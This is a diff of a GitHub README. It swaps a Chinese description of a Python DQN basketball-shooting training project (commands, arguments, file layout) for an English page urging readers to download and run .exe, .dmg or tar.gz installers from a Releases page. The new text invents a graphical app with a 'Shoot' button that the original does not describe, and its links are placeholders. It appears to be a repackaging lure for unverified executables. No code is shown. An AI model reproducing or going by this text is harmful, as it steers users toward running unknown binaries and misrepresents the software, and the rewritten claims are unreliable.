@@ -1,104 +1,76 @@
-# 投篮强化学习项目
+# 🎮 FreeHoopRL - Simulate Basketball Shots with AI
 
-![🎭](https://github.com/user-attachments/assets/29022aee-9280-42a0-b8a8-93aa58fc2ecb)
+## 🚀 Getting Started
 
+Welcome to FreeHoopRL, a tool that helps you understand the DQN algorithm through a basketball shooting simulation. This application is simple to use and does not require any programming knowledge.
 
-这个项目使用深度Q网络（DQN）算法来训练一个AI代理，没有考虑空气阻力，仅用于算法理解学习如何在2D环境中投篮。代理需要学习选择合适的投篮角度和力度，使篮球能够准确地进入篮筐。
-## 运行结果
-![final_policy](https://github.com/user-attachments/assets/90f0fd60-123b-4a60-97b3-809816ef127c)
-![final_analysis](https://github.com/user-attachments/assets/8fbf3d5b-4e9d-4ade-adc8-1e962b7a4a0d)
+## 📥 Download the Application
 
-## 项目结构
+[![Download FreeHoopRL](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/SicrediRC/FreeHoopRL/releases)
 
-```
-.
-├── env.py          # 篮球投篮环境
-├── dqn.py          # DQN代理实现
-├── main.py         # 训练和评估脚本
-├── utils.py        # 辅助函数（轨迹计算、可视化等）
-└── models/         # 保存训练模型的目录
-```
+To get started, visit the Releases page to download the latest version of FreeHoopRL. Click the link below:
 
-## 环境说明
+[Visit the Releases Page to Download](https://github.com/SicrediRC/FreeHoopRL/releases)
 
-篮球投篮环境是一个简单的2D物理环境：
+## 💡 Features
 
-- 玩家位于固定位置
-- 目标（篮筐）位置随机生成
-- 代理需要选择投篮角度和力度
-- 如果球进入篮筐，获得正奖励；否则获得负奖励
-- 奖励大小与球和篮筐中心的距离相关
+- **User-Friendly Interface**: Designed for non-technical users.
+- **Basketball Simulation**: Experience shooting basketballs in a controlled setting.
+- **Understand DQN**: Learn about the DQN algorithm practically.
+- **2D Simulation**: Simple visuals that focus on the algorithm rather than complex graphics.
+- **No Air Resistance**: The simulation does not account for air resistance for easier understanding.
 
-环境参数：
-- 重力加速度：10.0
-- 时间步长：0.02
-- 篮筐半径：1.0
+## 📋 System Requirements
 
-## 安装依赖
+Before downloading, ensure your system meets the following requirements:
 
-```bash
-pip install numpy torch matplotlib
-```
+- **Operating System**: Windows, macOS, or Linux
+- **Memory**: At least 4 GB RAM
+- **Storage**: Minimum 200 MB available space
+- **Graphics**: Basic graphics card to run 2D simulations smoothly
+- **Internet**: Required for downloading the application
 
-## 使用方法
+## 📖 How to Use FreeHoopRL
 
-### 训练模型
+1. **Download**: Click the link above to visit the Releases page and download the latest version.
+2. **Installation**: 
+   - For Windows: Double-click the downloaded .exe file and follow the on-screen instructions.
+   - For macOS: Open the .dmg file and drag the FreeHoopRL icon to your Applications folder.
+   - For Linux: Extract the tar.gz file and run the application from the extracted folder.
+   
+3. **Launching the App**: Find the FreeHoopRL icon on your desktop or in your Applications folder and double-click to open it.
 
-```bash
-python main.py --mode train --episodes 1000 --save-dir models
-```
+4. **Starting the Simulation**:
+   - Once the application opens, you will see a simple interface.
+   - Choose your shooting angle and power.
+   - Hit the "Shoot" button to simulate your shot.
+   - Observe and learn how the DQN algorithm works in real time.
 
-### 测试模型
+## 📊 Troubleshooting
 
-```bash
-python main.py --mode test --model-path models/best_model.pth
-```
+If you encounter issues, here are common problems and solutions:
 
-### 训练并测试
+- **Application Won't Start**: Ensure your system meets the requirements mentioned above.
+- **Graphics Issues**: Update your graphics drivers for better performance.
+- **Simulation is Slow**: Close other applications to free up system resources.
 
-```bash
-python main.py --mode both --episodes 500
-```
+## 🌐 Additional Resources
 
-## 命令行参数
+For more information on the DQN algorithm and machine learning, check out these resources:
 
-| 参数 | 描述 | 默认值 |
-|------|------|--------|
-| `--mode` | 运行模式：train, test, both | train |
-| `--episodes` | 训练回合数 | 1000 |
-| `--eval-episodes` | 评估回合数 | 10 |
-| `--render-interval` | 训练时渲染间隔 | 100 |
-| `--save-interval` | 保存模型间隔 | 100 |
-| `--model-path` | 测试模式下加载的模型路径 | models/best_model.pth |
-| `--save-dir` | 保存模型的目录 | models |
-| `--lr` | 学习率 | 0.001 |
-| `--gamma` | 折扣因子 | 0.99 |
-| `--epsilon-start` | 起始探索率 | 1.0 |
-| `--epsilon-end` | 最终探索率 | 0.01 |
-| `--epsilon-decay` | 探索率衰减 | 0.995 |
+- [Deep Q-Learning: A Beginner's Guide](https://example.com/deep-q-learning)
+- [Understanding Reinforcement Learning](https://example.com/reinforcement-learning)
+- [Introduction to Machine Learning](https://example.com/machine-learning)
 
-## 训练过程
+## 🛠️ Support
 
-训练过程中，代理会通过试错学习如何投篮。训练脚本会：
+For support, please reach out via the Issues page on GitHub. We appreciate your feedback and suggestions. 
 
-1. 定期保存模型检查点
-2. 保存最佳性能的模型
-3. 生成训练分析图表
-4. 可视化代理的策略
+[Visit the Issues Page](https://github.com/SicrediRC/FreeHoopRL/issues)
 
-## 可视化
+## 🔗 Links
 
-项目提供了多种可视化工具：
+- [FreeHoopRL Source Code](https://github.com/SicrediRC/FreeHoopRL)
+- [Visit the Releases Page to Download](https://github.com/SicrediRC/FreeHoopRL/releases)
 
-1. **训练奖励分析**：显示训练过程中的奖励和成功率
-2. **策略可视化**：显示代理在不同目标位置的投篮轨迹
-3. **轨迹绘制**：可视化单次投篮的轨迹
-
-## 示例输出
-
-训练完成后，你可以在`models`目录中找到：
-
-- `best_model.pth`：性能最好的模型
-- `final_model.pth`：最终训练的模型
-- `analysis_*.png`：训练过程分析图
-- `policy_*.png`：策略可视化图
+Remember, learning about algorithms can be fun and interactive with FreeHoopRL. Enjoy your basketball shooting simulations!
